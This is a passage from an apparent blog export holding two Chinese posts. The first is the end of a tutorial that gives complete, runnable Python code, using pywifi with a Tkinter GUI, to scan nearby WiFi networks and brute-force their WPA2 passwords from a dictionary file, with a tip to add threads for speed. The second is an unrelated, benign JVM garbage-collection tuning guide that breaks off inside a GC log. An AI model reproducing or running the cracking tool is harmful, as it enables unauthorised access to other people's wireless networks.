class=\"line\">                text.update()</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            continue</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 创建窗口</span><br><span class=\"line\">root = Tk()</span><br><span class=\"line\">root.title(&#x27;wifi破解&#x27;)</span><br><span class=\"line\">root.geometry(&#x27;500x400&#x27;)</span><br><span class=\"line\"># 标签</span><br><span class=\"line\">label = Label(root, text=&#x27;输入要破解的WIFI名称：&#x27;)</span><br><span class=\"line\"># 定位</span><br><span class=\"line\">label.grid()</span><br><span class=\"line\"># 输入控件</span><br><span class=\"line\">entry = Entry(root, font=(&#x27;微软雅黑&#x27;, 14))</span><br><span class=\"line\">entry.grid(row=0, column=1)</span><br><span class=\"line\"># 列表控件</span><br><span class=\"line\">text = Listbox(root, font=(&#x27;微软雅黑&#x27;, 14), width=40, height=10)</span><br><span class=\"line\">text.grid(row=1, columnspan=2)</span><br><span class=\"line\"># 按钮</span><br><span class=\"line\">button = Button(root, text=&#x27;开始破解&#x27;, width=20, height=2, command=readPwd)</span><br><span class=\"line\">button.grid(row=2, columnspan=2)</span><br><span class=\"line\"># 显示窗口</span><br><span class=\"line\">root.mainloop()</span><br></pre></td></tr></table></figure>\n\n<p>脚本运行效果：<br><img src=\"/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/4.png\"></p>\n<h2 id=\"UI升级版\"><a href=\"#UI升级版\" class=\"headerlink\" title=\"UI升级版\"></a><strong>UI升级版</strong></h2><p>以上图形界面未允许选择密码字典，下面进行优化升级：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">from tkinter import *</span><br><span class=\"line\">from tkinter import ttk</span><br><span class=\"line\">import pywifi</span><br><span class=\"line\">from pywifi import const</span><br><span class=\"line\">import time</span><br><span class=\"line\">import tkinter.filedialog  # 在Gui中打开文件浏览</span><br><span class=\"line\">import tkinter.messagebox  # 打开tkiner的消息提醒框</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class MY_GUI():</span><br><span class=\"line\">    def __init__(self, init_window_name):</span><br><span class=\"line\">        self.init_window_name = init_window_name</span><br><span class=\"line\">        # 密码文件路径</span><br><span class=\"line\">        self.get_value = StringVar()  # 设置可变内容</span><br><span class=\"line\">        # 获取破解wifi账号</span><br><span class=\"line\">        self.get_wifi_value = StringVar()</span><br><span class=\"line\">        # 获取wifi密码</span><br><span class=\"line\">        self.get_wifimm_value = StringVar()</span><br><span class=\"line\">        # 抓取网卡接口</span><br><span class=\"line\">        self.wifi = pywifi.PyWiFi()</span><br><span class=\"line\">        # 抓取第一个无线网卡</span><br><span class=\"line\">        self.iface = self.wifi.interfaces()[0]</span><br><span class=\"line\">        # 测试链接断开所有链接</span><br><span class=\"line\">        self.iface.disconnect()</span><br><span class=\"line\">        time.sleep(1)  # 休眠1秒</span><br><span class=\"line\">        # 测试网卡是否属于断开状态</span><br><span class=\"line\">        assert self.iface.status() in \\</span><br><span class=\"line\">               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        # 自动会调用的函数，返回自身的网卡</span><br><span class=\"line\">        return &#x27;(WIFI:%s,%s)&#x27; % (self.wifi, self.iface.name())</span><br><span class=\"line\"></span><br><span class=\"line\">    # 设置窗口</span><br><span class=\"line\">    def set_init_window(self):</span><br><span class=\"line\">        self.init_window_name.title(&quot;WIFI破解工具&quot;)</span><br><span class=\"line\">        self.init_window_name.geometry(&#x27;+500+200&#x27;)</span><br><span class=\"line\">        labelframe = LabelFrame(width=400, height=200, text=&quot;配置&quot;)  # 框架，以下对象都是对于labelframe中添加的</span><br><span class=\"line\">        labelframe.grid(column=0, row=0, padx=10, pady=10)</span><br><span class=\"line\">        self.search = Button(labelframe, text=&quot;搜索附近WiFi&quot;, command=self.scans_wifi_list).grid(column=0, row=0)</span><br><span class=\"line\">        self.pojie = Button(labelframe, text=&quot;开始破解&quot;, command=self.readPassWord).grid(column=1, row=0)</span><br><span class=\"line\">        self.label = Label(labelframe, text=&quot;目录路径：&quot;).grid(column=0, row=1)</span><br><span class=\"line\">        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)</span><br><span class=\"line\">        self.file = Button(labelframe, text=&quot;添加密码文件目录&quot;, command=self.add_mm_file).grid(column=2, row=1)</span><br><span class=\"line\">        self.wifi_text = Label(labelframe, text=&quot;WiFi账号：&quot;).grid(column=0, row=2)</span><br><span class=\"line\">        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)</span><br><span class=\"line\">        self.wifi_mm_text = Label(labelframe, text=&quot;WiFi密码：&quot;).grid(column=2, row=2)</span><br><span class=\"line\">        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,sticky=W)</span><br><span class=\"line\">        self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;)</span><br><span class=\"line\">        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)</span><br><span class=\"line\">        # 定义树形结构与滚动条</span><br><span class=\"line\">        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show=&quot;headings&quot;, columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;))</span><br><span class=\"line\">        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)</span><br><span class=\"line\">        self.wifi_tree.configure(yscrollcommand=self.vbar.set)</span><br><span class=\"line\">        # 表格的标题</span><br><span class=\"line\">        self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;)</span><br><span class=\"line\">        self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;)</span><br><span class=\"line\">        self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;)</span><br><span class=\"line\">        self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;)</span><br><span class=\"line\">        self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;)</span><br><span class=\"line\">        self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;)</span><br><span class=\"line\">        self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;)</span><br><span class=\"line\">        self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;)</span><br><span class=\"line\">        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)</span><br><span class=\"line\">        self.wifi_tree.bind(&quot;&lt;Double-1&gt;&quot;, self.onDBClick)</span><br><span class=\"line\">        self.vbar.grid(row=4, column=1, sticky=NS)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 搜索wifi</span><br><span class=\"line\">    def scans_wifi_list(self):  # 扫描周围wifi列表</span><br><span class=\"line\">        # 开始扫描</span><br><span class=\"line\">        print(&quot;^_^ 开始扫描附近wifi...&quot;)</span><br><span class=\"line\">        self.iface.scan()</span><br><span class=\"line\">        time.sleep(15)</span><br><span class=\"line\">        # 在若干秒后获取扫描结果</span><br><span class=\"line\">        scanres = self.iface.scan_results()</span><br><span class=\"line\">        # 统计附近被发现的热点数量</span><br><span class=\"line\">        nums = len(scanres)</span><br><span class=\"line\">        print(&quot;数量: %s&quot; % (nums))</span><br><span class=\"line\">        # 实际数据</span><br><span class=\"line\">        self.show_scans_wifi_list(scanres)</span><br><span class=\"line\">        return scanres</span><br><span class=\"line\"></span><br><span class=\"line\">    # 显示wifi列表</span><br><span class=\"line\">    def show_scans_wifi_list(self, scans_res):</span><br><span class=\"line\">        for index, wifi_info in enumerate(scans_res):</span><br><span class=\"line\">            self.wifi_tree.insert(&quot;&quot;, &#x27;end&#x27;, values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))</span><br><span class=\"line\"></span><br><span class=\"line\">    # 添加密码文件目录</span><br><span class=\"line\">    def add_mm_file(self):</span><br><span class=\"line\">        self.filename = tkinter.filedialog.askopenfilename()</span><br><span class=\"line\">        self.get_value.set(self.filename)</span><br><span class=\"line\"></span><br><span class=\"line\">    # Treeview绑定事件</span><br><span class=\"line\">    def onDBClick(self, event):</span><br><span class=\"line\">        self.sels = event.widget.selection()</span><br><span class=\"line\">        self.get_wifi_value.set(self.wifi_tree.item(self.sels, &quot;values&quot;)[1])</span><br><span class=\"line\"></span><br><span class=\"line\">    # 读取密码字典，进行匹配</span><br><span class=\"line\">    def readPassWord(self):</span><br><span class=\"line\">        self.getFilePath = self.get_value.get()</span><br><span class=\"line\">        self.get_wifissid = self.get_wifi_value.get()</span><br><span class=\"line\">        pwdfilehander = open(self.getFilePath, &quot;r&quot;, errors=&quot;ignore&quot;)</span><br><span class=\"line\">        while True:</span><br><span class=\"line\">            try:</span><br><span class=\"line\">                self.pwdStr = pwdfilehander.readline()</span><br><span class=\"line\">                if not self.pwdStr:</span><br><span class=\"line\">                    break</span><br><span class=\"line\">                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)</span><br><span class=\"line\">                if self.bool1:</span><br><span class=\"line\">                    self.res = &quot;[*] 密码正确！wifi名：%s，匹配密码：%s &quot; % (self.get_wifissid, self.pwdStr)</span><br><span class=\"line\">                    self.get_wifimm_value.set(self.pwdStr)</span><br><span class=\"line\">                    tkinter.messagebox.showinfo(&#x27;提示&#x27;, &#x27;破解成功！！！&#x27;)</span><br><span class=\"line\">                    print(self.res)</span><br><span class=\"line\">                    break</span><br><span class=\"line\">                else:</span><br><span class=\"line\">                    self.res = &quot;[*] 密码错误！wifi名:%s，匹配密码：%s&quot; % (self.get_wifissid, self.pwdStr)</span><br><span class=\"line\">                    print(self.res)</span><br><span class=\"line\">                time.sleep(3)</span><br><span class=\"line\">            except:</span><br><span class=\"line\">                continue</span><br><span class=\"line\"></span><br><span class=\"line\">    # 对wifi和密码进行匹配</span><br><span class=\"line\">    def connect(self, pwd_Str, wifi_ssid):</span><br><span class=\"line\">        # 创建wifi链接文件</span><br><span class=\"line\">        self.profile = pywifi.Profile()</span><br><span class=\"line\">        self.profile.ssid = wifi_ssid  # wifi名称</span><br><span class=\"line\">        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放</span><br><span class=\"line\">        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法</span><br><span class=\"line\">        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元</span><br><span class=\"line\">        self.profile.key = pwd_Str  # 密码</span><br><span class=\"line\">        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件</span><br><span class=\"line\">        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件</span><br><span class=\"line\">        self.iface.connect(self.tmp_profile)  # 链接</span><br><span class=\"line\">        time.sleep(5)</span><br><span class=\"line\">        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上</span><br><span class=\"line\">            isOK = True</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            isOK = False</span><br><span class=\"line\">        self.iface.disconnect()  # 断开</span><br><span class=\"line\">        time.sleep(1)</span><br><span class=\"line\">        # 检查断开状态</span><br><span class=\"line\">        assert self.iface.status() in \\</span><br><span class=\"line\">               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]</span><br><span class=\"line\">        return isOK</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def gui_start():</span><br><span class=\"line\">    init_window = Tk()</span><br><span class=\"line\">    ui = MY_GUI(init_window)</span><br><span class=\"line\">    print(ui)</span><br><span class=\"line\">    ui.set_init_window()</span><br><span class=\"line\">    init_window.mainloop()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    gui_start()</span><br></pre></td></tr></table></figure>\n\n<p>脚本运行效果如下：</p>\n<p><img src=\"/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/5.png\"></p>\n<p>以上基于 Python 的 GUI 图形界面开发库 Tkinter，实际上 Python 的 GUI 编程可以借助 PyQt5 来自动生成 UI 代码。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>本文学习了 Python 暴力破解 WIFI 密码的方法、以及 Python GUI 图形化编程的基础使用。所演示的代码的不足在于均没有使用多线程进行 WIFI 连接测试，实际上因为 WIFI 连接测试需要一定的耗时（3-5秒），故使用多线程将能减少暴力破解过程的等待时间。</p>\n"},{"title":"JVM如何调优","date":"2024-06-16T10:16:05.000Z","_content":"\n\n\n\n一：引言\n----\n\n在软件开发和运维中，JVM作为执行Java程序的核心引擎，扮演着至关重要的角色。\n\n随着应用程序的复杂性和负载不断增加，对JVM的性能和稳定性要求也越来越高。\n\n在此背景下，JVM调优变得至关重要。\n\nJVM调优涉及到一系列的参数设置、垃圾收集器的选择、内存分配策略等方面，对于提高Java应用程序的性能、减少内存泄漏、降低系统崩溃风险都有重要作用。\n\n另外，在大厂面试中，JVM调优的知识也是备受关注的考察点，因为它直接关系到系统的稳定性和性能优化。\n\n候选人对JVM调优的理解和实践能力，可以反映其在Java虚拟机运行机制方面的深度和广度，\n\n需要注意的是，调优并非首选方法，一般而言，解决性能问题的第一步是优化程序本身，只有在必要时才考虑进行JVM调优。\n\nJVM调优，有什么好处？\n------------\n\nJVM调优目的是通过调整Java虚拟机的配置参数、垃圾回收策略和内存分配等手段，提升Java应用程序的性能、稳定性和可靠性。\n\n随着应用规模和用户量的增长，原始的JVM配置可能无法满足业务需求，因此必须进行调优以确保系统的正常运行。\n\n然而，并不是所有异常情况都需要进行JVM调优。\n\n在实际情况中，大多数问题可以通过分析JVM日志文件和业务逻辑来定位，并通过业务层面的优化来解决。\n\n尽管如此，深入了解各项参数和指标仍然至关重要，因为它们有助于更快速地理解和解决问题，调优能带来什么好处？\n\n*   **性能层面：**\n\n    通过调整JVM参数和优化垃圾回收机制，能够提高Java应用程序的性能，减少延迟，提升系统响应速度和并发能力、和吞吐量。\n\n*   **资源利用：**\n\n    合理配置JVM资源，包括内存、CPU等，能够有效地利用硬件资源，提高系统的资源利用率，降低成本。\n\n*   **稳定性：** 通过调优JVM，可减少内存泄漏、OOM（Out of Memory）等问题的发生，提高系统的稳定性和可靠性，降低系统崩溃的风险。\n\n\n二：JVM调优的关注哪些指标？\n---------------\n\n调优，到底调的是什么？\n\n调优之前，要搞清楚一个问题：怎样才算是“优”。\n\n如何定性？\n\n如何定量？\n\n到底需要其实是需要关注几个关键的指标，以全面评估系统的运行状态和性能表现。\n\n需要有一个具体的指标来衡量性能情况，而在JVM里面衡量性能的两个核心指标分别“吞吐量”和“停顿时间”。\n\n### 核心指标1：吞吐量(throughput)：\n\n程序运行过程中执行两种任务，分别是执行业务代码的 任务 和进行垃圾回收的任务，\n\n吞吐量大，意就是说程序运行业务代码的时间越多， 换句话说，执行业务任务越多， 吞吐量就越高，\n\n吞吐量计算公式 ，\n\n```\n\n\n吞吐量 = CPU在用户应用程序运行的时间 / （CPU在用户应用程序运行的时间 + CPU垃圾回收的时间），  \n\n\n\n```\n\n在实践中我们发现对于大多数的应用领域，评估一个垃圾收集(GC)算法如何，有如下一个核心标准：\n\n*   吞吐量越高越好\n\n\n一般而言GC 的吞吐量不能低于 95%。\n\n本质上，吞吐量是指应用程序线程用时占程序总用时的比例。\n\n例如，吞吐量99/100， 意味着100秒的程序执行时间，应用程序线程运行了99秒， 而在这一时间段内GC线程只运行了1秒。\n\n### 核心指标2：停顿时间(pause times)：\n\nJVM在专门的线程(GC threads)中执行GC。\n\n因为JVM进行垃圾回收的时候，某些阶段必须要停止业务线程专心进行垃圾收集， 只要GC线程是活动的，它们将与应用程序线程(application threads)争用当前可用CPU的时钟周期。\n\n停顿时间(pause times) 是指一个时间段内应用程序线程让与GC线程执行，而应用程序线程完全暂停。\n\n例如，GC期间100毫秒的停顿时间， 意味着在这100毫秒期间内没有应用程序线程是活动的。\n\n如果说一个正在运行的应用程序有100毫秒的“平均停顿时间”，那么就是说该应用程序所有的停顿时间平均长度为100毫秒。\n\n同样，100毫秒的“最大停顿时间”是指：该应用程序所有的停顿时间最大不超过100毫秒。\n\n注意，这里说的JVM停顿时间，就是指JVM停止业务线程而去进行垃圾收集的这段时长，其实指的是**每次GC造成用户线程停顿的平均时间**，不是总的垃圾回收时间。\n\n停顿时间越长，就意味着GC场景下，用户线程平均等待的时间越长，停顿时间会直接影响用户使用系统的体验。\n\n除了吞吐量(throughput) 、停顿时间(pause times) 两个核心指标，JVM调优还会关心下面的非核心指标：\n\n### 核心指标3：堆内存占用量：\n\n细致监控堆内存使用量、非堆内存使用量以及永久代（或元空间）使用量指标数据。\n\n举例来说，当堆内存使用量持续增加，而内存回收频率较低时，可能暗示着潜在的内存泄漏问题，这可能导致系统性能下降或者最终的内存耗尽（OOM）。\n\n### 非核指标1：垃圾回收次数\n\nGC非常占用CPU资源的，如果GC占用的资源越多，那么意味着其他事情所用的资源会减少，系统所能做的事情也会越少。\n\n尽管垃圾回收过程会消耗大量的CPU资源，但是我们也不能单纯地、一味的追求GC次数减少\n\n为啥? GC次数减少了，有可能单次GC的时间变长，那么就可能会增加单次GC的“停顿时长”（核心指标2），\n\n### 非核指标2：垃圾回收频率\n\n通常情况下，与垃圾回收次数相比，较低的垃圾回收频率被认为是更好的选择。\n\n垃圾回收的频率,需要适中\n\n*   频率过小,每次垃圾回收的时间会过长\n\n*   频率过大,停顿时间长,延迟高\n\n\n所以：通常来说垃圾回收频率是越低越好。\n\n详细记录GC频率、GC停顿时间以及每次GC后的内存情况。\n\n或者说：减少 GC次数可能会导致单次垃圾回收的时间变长，进而增加单次垃圾回收的“停顿时长”。\n\n所以， 需要在这两者之间做一些平衡。\n\n吞吐量、暂停时间、堆内存占用三者之间的关系\n---------------------\n\n这三个指标不可能同时达到,因为他们是一个不可能的关系\n\n**内存变大,要回收的东西变多,暂停时间自然增加.**\n\n**吞吐量增加,必然要降低垃圾回收频率,频率降低,垃圾谁收停顿时间必然增大.**\n\n因此,目前gc的优化方向主要是**吞吐量和暂停时间.**\n\n### “高吞吐量”和“低停顿时间”是一对相互竞争的目标\n\n高吞吐量最好因为这会让应用程序的最终用户感觉只有应用程序线程在做“生产性”工作。\n\n直觉上，吞吐量越高程序运行越快。\n\n低停顿时间最好因为从最终用户的角度来看不管是GC还是其他原因导致一个应用被挂起始终是不好的。\n\n这取决于应用程序的类型，有时候甚至短暂的200毫秒暂停都可能打断终端用户体验。\n\n因此，具有低的最大停顿时间是非常重要的，特别是对于一个交互式应用程序。\n\n不幸的是”高吞吐量”和”低停顿时间”是一对相互竞争的目标（矛盾）。\n\nGC需要一定的前提条件以便安全地运行。\n\n例如，必须保证应用程序线程在GC线程试图确定哪些对象仍然被引用和哪些没有被引用的时候不修改对象的状态。\n\n为此，应用程序在GC期间必须停止(或者仅在GC的特定阶段，这取决于所使用的算法)。 然而这会增加额外的线程调度开销：直接开销是上下文切换，间接开销是因为缓存的影响。\n\n加上JVM内部安全措施的开销，这意味着GC及随之而来的不可忽略的开销，将增加GC线程执行实际工作的时间。\n\n因此我们可以通过尽可能少运行GC，来最大化吞吐量，例如，只有在不可避免的时候进行GC，来节省所有与它相关的开销。\n\n然而，仅仅偶尔运行GC意味着每当GC运行时将有许多工作要做，因为在此期间积累在堆中的对象数量很高。 单个GC需要花更多时间来完成， 从而导致更高的平均和最大停顿时间。\n\n因此，考虑到低停顿时间，最好频繁地运行GC以便更快速地完成。这反过来又增加了开销并导致吞吐量下降，我们又回到了起点。\n\n综上所述，在设计（或使用）GC算法时，我们必须确定我们的目标：\n\n一个GC算法只可能针对两个目标之一（即只专注于最大吞吐量或最小停顿时间），或尝试找到一个二者的折衷。\n\n### 吞吐量和暂停时间是矛盾的,如何抉择?\n\n高吞吐量较好因为这会让应用程序的最终用户感觉只有应用程序线程在做\"生产性\"工作。直觉上,吞吐量越高程序运行越快。\n\n低暂停时间(低延迟)较好因为从最终用户的角度来看不管是GC还是其他原因导致一个应用被挂起始终是不好的。这取决于应用程序的类型, 有时候甚至短暂的200毫秒暂停都可能打断终端用户体验 。因此,具有低的较大暂停时间是非常重要的,特别是对于一个 交互式应用程序 。\n\n不幸的是\"高吞吐量\"和\"低暂停时间\"是一对相互竞争的目标(矛盾)。\n\n*   因为如果选择以吞吐量优先,那么 必然需要降低内存回收的执行频率 ,但是这样会导致GC需要更长的暂停时间来执行内存回收。\n\n*   相反的,如果选择以低延迟优先为原则,那么为了降低每次执行的内存回收时的暂停时间,也 只能频繁地执行内存回收 ,但这又引起了年轻代内存的缩减和导致程序吞吐量的下降。\n\n\n在设计(或使用)GC算法时,我们必须确定我们的目标: 一个GC算法可能针对两个目标之一(即只专注于较大吞吐量或最小暂停时间),或尝试找到一个二者的折中。\n\n现在标准: 在最大吞吐量优先的情况下,降低停顿时间\n\n### 不同的垃圾回收器有不同的抉择方向:\n\n*   Parallel以吞吐量优先\n\n*   cms以停顿时间优先\n\n*   而G1则取折中方案: 在保证用户可接受的停顿时间的前提下,尽可能提高吞吐量.\n\n\nJVM调优没有万能的公式和标准，因为每个人所面对的场景是不一样。\n\n要想调整到最优的性能，其实首先要确认的是自己的需求目标是什么(以吞吐量优先/停顿时间优先)，\n\n然后，根据这个目标去慢慢的调整各项指标，从而达到一个最佳的平衡点。\n\n三：如果获得JVM内存指标?\n--------------\n\n在项目启动的时候 增加下列参数来收集GC日志，然后通过第三方的日志分析工具（比如GCesay:https://gceasy.io/）\n\n分析收集到的GC日志来得到吞吐量、停顿时间相关的统计数据。\n\n```\n\n\n java    \n -XX:+PrintGCDetails -XX:+PrintGCDateStamps   \n -XX:+UseGCLogFileRotation   \n -XX:+PrintHeapAtGC -XX:NumberOfGCLogFiles=5    \n -XX:GCLogFileSize=20M      \n -Xloggc:/opt/ard-user-gc-%t.log    \n -jar abg-user-1.0-SNAPSHOT.jar \n\n\n```\n```\n\n\n -Xloggc:/opt/app/ard-user/ard-user-gc-%t.log   设置日志目录和日志名称  \n -XX:+UseGCLogFileRotation           开启滚动生成日志  \n -XX:NumberOfGCLogFiles=5            滚动GC日志文件数，默认0，不滚动  \n -XX:GCLogFileSize=20M               GC文件滚动大小，需开启UseGCLogFileRotation  \n -XX:+PrintGCDetails                 开启记录GC日志详细信息（包括GC类型、各个操作使用的时间）,并且在程序运行结束打印出JVM的内存占用情况  \n -XX:+ PrintGCDateStamps             记录系统的GC时间             \n -XX:+PrintGCCause                   产生GC的原因(默认开启)\n\n\n```\n\n### 日志分析工具有哪些？\n\n我们看到日志，尤其是CMS和G1的日志，直接看日志文档都是很不方便的，密密麻麻的文字，其实市面上已经有一些日志分析工具了。\n\n进行系统调优时，首先需要对系统的各项指标进行检测。为了有效地进行监测和设置相应的阈值，我们通常会借助监控工具，例如普罗米修斯等。在分析阶段，以下工具是常用的：\n\n1.  VisualVM：\n\n    这是一个功能强大、可扩展的开源工具，用于深入分析Java应用程序。它提供了丰富的功能，包括性能监控、内存使用情况、垃圾回收情况等，并支持线程分析、堆快照等功能。\n\n2.  Java Mission Control (JMC)：\n\n    由Oracle提供的专业Java性能监控和故障诊断工具。JMC集成了多种强大功能，包括垃圾回收分析、内存泄漏检测、线程分析等。\n\n3.  jvisualvm：\n\n    这是JDK自带的监控和调试工具，可用于监视本地和远程Java应用程序的性能、内存使用情况等。它提供了直观的图形界面和丰富的监控指标。\n\n4.  JConsole：\n\n    JConsole是JDK自带的监控工具，提供了基本的图形界面，可用于监视Java应用程序的内存使用情况、线程信息、垃圾回收情况等。\n\n5.  GCViewer：\n\n    这是专门用于分析Java应用程序垃圾回收日志的工具。\n\n    GCViewer能将GC日志解析成易于理解的图表和统计信息，帮助用户分析和优化垃圾回收行为。\n\n\n接下来，介绍使用 gceasy.io 进行 日志分析\n\n网址：https://gceasy.io/\n\n注意：这款工具不需要我们下载软件，他是在线的。\n\n我们要做的就是两步：\n\n步骤一：导出GC日志到本地磁盘\n\n步骤二：将本地日志上传到gceasy.io上，进行分析\n\n### 指标分析第一步：导出日志\n\n```\n\n\n\\-Xloggc:/Users/lxl/Downloads/gc.log  \n\\-XX:+PrintGCDetails  \n\\-XX:+PrintGCDateStamps  \n\\-XX:+PrintGCTimeStamps  \n\\-XX:+PrintGCCause  \n  \n\n\n\n```\n\n*   ‐Xloggc参数：指定gc日志的保存地址。这里指定的是当前目录，文件名以gc-+时间戳.log打印。%t表示时间戳\n\n*   ‐XX:+PrintGCDetails：在日志中打印GC详情。\n\n*   ‐XX:+PrintGCDateStamps：在日志中打印GC的时间\n\n*   ‐XX:+PrintGCTimeStamps：在日志中打印GC耗时\n\n*   ‐XX:+PrintGCCause ： \\[这个参数没查到\\]\n\n*   ‐XX:+UseGCLogFileRotation：这个参数表示以滚动文件的形式打印日志\n\n*   ‐XX:NumberOfGCLogFiles：GC日志文件的最大个数，这里设置10个\n\n*   ‐XX:GCLogFileSize：GC日志每个文件的最大容量，这里是100M\n\n\n我们把日志下载到Downloads文件夹下了。以下便是GC日志的全部内容\n\n```\n\n\nJava HotSpot(TM) 64-Bit Server VM (25.202-b08) for bsd-amd64 JRE (1.8.0\\_202-b08), built on Dec 15 2018 20:16:16 by \"java\\_re\" with gcc 4.2.1 (Based on Apple Inc. build 5658) (LLVM build 2336.11.00)  \nMemory: 4k page, physical 16777216k(1745536k free)  \n/proc/meminfo:  \nCommandLine flags: -XX:-BytecodeVerificationLocal -XX:-BytecodeVerificationRemote -XX:InitialHeapSize=268435456 -XX:+ManagementServer -XX:MaxHeapSize=4294967296 -XX:+PrintGC -XX:+PrintGCCause -XX:+PrintGCDateStamps -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:TieredStopAtLevel=1 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC   \n2022-01-12T15:02:37.044-0800: 0.839: \\[GC (Allocation Failure) \\[PSYoungGen: 65536K->4400K(76288K)\\] 65536K->4416K(251392K), 0.0043915 secs\\] \\[Times: user=0.01 sys=0.00, real=0.00 secs\\]   \n2022-01-12T15:02:37.308-0800: 1.103: \\[GC (Allocation Failure) \\[PSYoungGen: 69936K->4959K(76288K)\\] 69952K->5047K(251392K), 0.0046449 secs\\] \\[Times: user=0.02 sys=0.01, real=0.01 secs\\]   \n2022-01-12T15:02:37.625-0800: 1.420: \\[GC (Allocation Failure) \\[PSYoungGen: 70495K->7467K(76288K)\\] 70583K->7563K(251392K), 0.0051392 secs\\] \\[Times: user=0.02 sys=0.00, real=0.01 secs\\]   \n2022-01-12T15:02:37.831-0800: 1.627: \\[GC (Allocation Failure) \\[PSYoungGen: 73003K->9356K(141824K)\\] 73099K->9460K(316928K), 0.0072596 secs\\] \\[Times: user=0.03 sys=0.01, real=0.00 secs\\]   \n2022-01-12T15:02:37.869-0800: 1.664: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 22322K->7049K(141824K)\\] 22426K->7161K(316928K), 0.0057809 secs\\] \\[Times: user=0.02 sys=0.00, real=0.01 secs\\]   \n2022-01-12T15:02:37.875-0800: 1.670: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 7049K->0K(141824K)\\] \\[ParOldGen: 112K->6873K(87040K)\\] 7161K->6873K(228864K), \\[Metaspace: 20573K->20571K(1067008K)\\], 0.0237404 secs\\] \\[Times: user=0.09 sys=0.01, real=0.02 secs\\]   \n2022-01-12T15:02:38.392-0800: 2.188: \\[GC (Allocation Failure) \\[PSYoungGen: 131072K->7194K(236032K)\\] 137945K->14075K(323072K), 0.0054542 secs\\] \\[Times: user=0.01 sys=0.01, real=0.00 secs\\]   \n2022-01-12T15:02:39.850-0800: 3.646: \\[GC (Allocation Failure) \\[PSYoungGen: 235546K->9697K(270336K)\\] 242427K->20203K(357376K), 0.0092838 secs\\] \\[Times: user=0.02 sys=0.01, real=0.01 secs\\]   \n2022-01-12T15:02:40.479-0800: 4.274: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 179780K->12779K(397312K)\\] 190286K->25839K(484352K), 0.0117953 secs\\] \\[Times: user=0.04 sys=0.01, real=0.02 secs\\]   \n2022-01-12T15:02:40.491-0800: 4.286: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 12779K->0K(397312K)\\] \\[ParOldGen: 13059K->21448K(132096K)\\] 25839K->21448K(529408K), \\[Metaspace: 34068K->34068K(1079296K)\\], 0.0437361 secs\\] \\[Times: user=0.16 sys=0.01, real=0.04 secs\\]   \n2022-01-12T15:02:42.177-0800: 5.972: \\[GC (Allocation Failure) \\[PSYoungGen: 384512K->13185K(399872K)\\] 405960K->34641K(531968K), 0.0115070 secs\\] \\[Times: user=0.04 sys=0.01, real=0.01 secs\\]   \n2022-01-12T15:02:43.010-0800: 6.806: \\[GC (Allocation Failure) \\[PSYoungGen: 397697K->16864K(530432K)\\] 419153K->58461K(662528K), 0.0248406 secs\\] \\[Times: user=0.04 sys=0.02, real=0.02 secs\\]   \n2022-01-12T15:02:44.338-0800: 8.133: \\[GC (Allocation Failure) \\[PSYoungGen: 530400K->26083K(539648K)\\] 571997K->86488K(671744K), 0.0302789 secs\\] \\[Times: user=0.06 sys=0.02, real=0.03 secs\\]   \n2022-01-12T15:02:45.800-0800: 9.595: \\[GC (Allocation Failure) \\[PSYoungGen: 539619K->32647K(733696K)\\] 600024K->99769K(865792K), 0.0280332 secs\\] \\[Times: user=0.04 sys=0.02, real=0.02 secs\\]   \n2022-01-12T15:02:47.765-0800: 11.560: \\[GC (Allocation Failure) 